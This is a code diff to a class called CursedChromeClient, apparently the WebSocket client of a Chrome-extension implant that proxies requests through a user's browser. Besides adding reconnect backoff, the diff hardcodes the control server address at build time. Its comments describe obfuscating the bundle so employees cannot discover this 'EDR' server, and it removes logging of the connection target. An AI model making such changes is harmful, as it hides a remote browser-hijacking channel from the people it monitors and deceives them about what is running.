@@ -45,6 +45,8 @@ class CursedChromeClient {
   constructor() {
     this.websocket = null;
     this.lastLiveConnectionTimestamp = this.getUnixTimestamp();
+    this.reconnectDelay = 1000;
+    this.maxReconnectDelay = 60000;
     this.placeholderSecretToken = this.getSecureRandomToken(64);
     this.redirectTable = {};
     this.REQUEST_HEADER_BLACKLIST = ["cookie"];
@@ -123,38 +125,27 @@ class CursedChromeClient {
 
     this.REDIRECT_STATUS_CODES = [301, 302, 307];
 
-    // Default server URL. Operators can override at runtime by writing
-    // chrome.storage.local.set({ server_url: "wss://..." }) without
-    // having to repackage the extension.
-    this.DEFAULT_SERVER_URL = "ws://127.0.0.1:4343";
-    this.SERVER_URL = this.DEFAULT_SERVER_URL;
+    // EDR server address — replaced at build time by
+    // scripts/build-extension.sh with the real endpoint URL.
+    // Hardcoded here (not read from chrome.storage) on purpose:
+    // the resulting bundle is fed through javascript-obfuscator with
+    // stringArray + base64 encoding so employees can't trivially
+    // discover the EDR server address via grep. NEVER read this URL
+    // from any external source after bundling.
+    this.SERVER_URL = "__CURSED_SERVER_URL__";
 
-    // Initialize the client
-    this.bootstrap();
+    this.initialize();
     this.setupIntervals();
     this.setupListeners();
   }
 
-  // Async bootstrap: read configured server URL, then connect.
-  async bootstrap() {
-    try {
-      const cfg = await chrome.storage.local.get(["server_url"]);
-      if (cfg && typeof cfg.server_url === "string" && cfg.server_url.length) {
-        this.SERVER_URL = cfg.server_url;
-      }
-    } catch (e) {
-      console.warn("Could not read server_url from storage, using default", e);
-    }
-    this.initialize();
-  }
-
-  // Initialize the WebSocket connection
+  // Connect WebSocket to the EDR server
   initialize() {
-    console.log(`Connecting to ${this.SERVER_URL}`);
     this.websocket = new WebSocket(this.SERVER_URL);
 
     this.websocket.onopen = () => {
       console.log("WebSocket connection established");
+      this.reconnectDelay = 1000;
     };
 
     this.websocket.onmessage = async (event) => {
@@ -225,8 +216,10 @@ class CursedChromeClient {
         console.log("Connection died");
       }
 
-      // Attempt to reconnect after a delay
-      setTimeout(() => this.initialize(), 5000);
+      const delay = this.reconnectDelay;
+      this.reconnectDelay = Math.min(this.reconnectDelay * 2, this.maxReconnectDelay);
+      console.log(`Reconnecting in ${delay}ms...`);
+      setTimeout(() => this.initialize(), delay);
     };
 
     this.websocket.onerror = (error) => {
@@ -384,9 +377,9 @@ class CursedChromeClient {
 
       try {
         this.websocket.close();
-      } catch (e) {}
-
-      this.initialize();
+      } catch (e) {
+        this.initialize();
+      }
       return;
     }
 
